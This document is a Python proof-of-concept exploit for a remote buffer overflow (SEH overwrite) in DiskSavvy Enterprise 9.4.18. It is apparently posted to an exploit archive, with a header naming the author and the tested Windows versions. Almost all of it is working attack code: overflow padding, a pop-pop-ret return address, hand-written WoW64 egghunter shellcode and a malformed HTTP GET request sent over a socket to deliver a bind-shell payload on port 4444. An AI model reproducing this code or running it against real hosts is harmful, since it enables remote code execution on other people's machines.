# Exploit Title: DiskSavvy Enterprise 9.4.18 - Remote buffer overflow - SEH overwrite with WoW64 egghunters 
# Date: 2017-02-22
# Exploit Author: Peter Baris
# Vendor Homepage: www.saptech-erp.com.au
# Software Link: http://www.disksavvy.com/downloads.html
# Version: 9.4.18
# Tested on: Windows 7 Pro SP1 x64 (fully patched) and Windows 10 Pro x64

# WoW64 egghunters are in use in this exploit, meaning it will work on specific 64bit operating systems
# Original Win7 egghunter: https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/ - but I modified it for this exploit
# Win10 WoW64 egghunter only supports x86_64 platform - developed by Peter Baris based on corelan's Win7 version
# If you require a WoW64 egghunter for additional windows versions, contact me through my website http://saptech-erp.com.au/services.php

from payload import buf
from struct import pack
import socket
import struct
def shell_attack(target_machine, target_port):
  
  host = target_machine
      
  port = target_port
  


  # 355 bytes bind shell, PORT 4444,  bad chars \x09\x0a\x0d\x20
  

  crash = "\x41" * 2487
  retn = "\x38\x2e\x14\x10" # 0x10142e38 pop edi pop esi ret
  filler = "\x44" * (2505-334-300-100)
  nseh = "\xeb\x08\x90\x90"
  stack_fill="\x41"*100
  nops="\x90"*8
  egg = "t00wt00w"

  
  wow64_egghunter = ("\x66\x8c\xcb\x80\xfb\x23\x75\x08\x31\xdb\x53\x53\x53\x53\xb3\xc0"
  "\x33\xd2" 
  "\x66\x81\xca\xff\x0f\x42\x52\x80\xfb\xc0\x74\x19\x6a\x02\x58\xcd"
  "\x2e\x5a\x3c\x05\x74\xef\xb8" 
  "\x74\x30\x30\x77"
  "\x89\xd7\xaf\x75\xe5\xaf\x75\xe2\xff\xe7\x6a\x26\x58\x31\xc9\x89"
  "\xe2\x64\xff\x13\x5e\x5a\xeb\xdf")

  # elif os == "win10":
  #   wow64_egghunter = ("\x66\x8c\xcb\x80\xfb\x23\x75\x10\x31\xd2\x66\x81\xca\xff\x0f\x31"
  # "\xdb\x42\x52\x53\x53\x53\xb3\xc0\x80\xfb\xc0\x74\x13\x3c\x05\x74\xee\xb8"
  # "\x74\x30\x30\x77"
  # "\x89\xd7\xaf\x75\xe4\xaf\x75\xe1\xff\xe7"
  # "\x6a\x29\x58\x64\xff\x13\x83\xc4\x0c\x5a\xeb\xe1")

 

  exploit = crash + nseh + retn + nops + wow64_egghunter + stack_fill + egg + nops  + str(buf)+ filler

  buffer = "GET /"+exploit+" HTTP/1.1\r\n"
  buffer+= "Host: "+host+"\r\n"
  buffer+= "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:44.0) Gecko/20100101 Firefox/44.0 Iceweasel/44.0.2\r\n"
  buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer+="Accept-Language: en-US,en;q=0.5\r\n"
  buffer+="Accept-Encoding: gzip, deflate\r\n"
  buffer+="Referer: http://"+host+"/login\r\n"
  buffer+="Connection: keep-alive\r\n"
  buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
  buffer+="Content-Length: 5900\r\n\r\n"
  
  buffer = bytes(buffer, 'utf-8')
  
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host,port))

  s.send(buffer)
  s.close()